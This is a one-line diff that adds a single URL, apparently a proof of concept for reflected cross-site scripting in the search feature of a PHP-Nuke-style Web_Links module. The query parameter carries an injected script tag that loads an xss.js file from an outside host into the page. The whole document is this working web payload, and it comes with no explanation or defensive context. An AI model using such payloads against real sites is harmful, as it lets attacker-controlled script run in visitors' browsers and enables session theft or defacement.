@@ -1,0 +1,1 @@
+http://www.example.com/portal/modules.php?name=Web_Links&amp;l_op=search&amp;query=%3Cscript%20src=http://websecurity.com.ua/webtools/xss.js%20
